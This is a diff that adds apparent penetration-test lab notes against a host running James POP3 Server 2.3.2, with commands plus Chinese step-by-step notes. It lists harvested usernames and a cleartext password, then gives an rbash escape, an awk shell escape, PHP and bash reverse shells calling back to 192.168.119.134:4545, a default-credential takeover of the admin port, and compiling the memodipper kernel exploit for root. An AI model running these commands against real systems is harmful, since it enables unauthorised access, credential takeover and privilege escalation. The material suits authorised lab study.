@@ -1,0 +1,37 @@
+nmap -sV -sC -Pn 10.11.1.72 > nmap.txt
+gobuster dir  -u http://10.11.1.72 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t50 > gobuster.txt
+
+
+nmap -p- -T50 10.11.1.72 > nmapall.txt
+user: marcus
+user: john
+user: mailadmin
+user: jenny
+user: ryuu
+user: joe45
+
+username: ryuu
+password: QUHqhUPRKXMo4m7k
+ssh ryuu@10.11.1.72 -t "bash --noprofile"
+
+/usr/bin/awk 'BEGIN {system("/bin/sh")}'
+php -r '$sock=fsockopen("192.168.119.134",4545);exec("/bin/bash -i <&3 >&3 2>&3");'
+bash -i >& /dev/tcp/192.168.119.134/4545 0>&1
+
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+
+1.nmap掃描發現110 25port使用nc連線發現110port是JAMES POP3 Server 2.3.2 該服務有管理端口4555
+2.嘗試登入4555默認帳密root,root,將所有用戶帳密更改
+3.進入到110port登入用戶,必須使用telnet登入,stat查看有無郵件
+4.可使用ryuu登入但rbash無法跳脫
+5.searchexploit查找到james35513.py漏洞,上傳文件,待用戶登入後會自動執行
+6.待用戶執行取得reverse shell後,添加環境變量後取得正常shell
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+7.使用python spawn一個互動式shell
+python -c "import pty;pty.spawn('/bin/bash')"
+8.取得互動式shell後必須再一次export環境變量
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+9.下載linux-exploit-suggester.sh,並於受害機執行,發現有memodipper題權方法
+10.下載memodipper取名成memodipper.c並傳到受害機,在受害機執行gcc memodipper.c -o pri (compile)
+11.執行pri
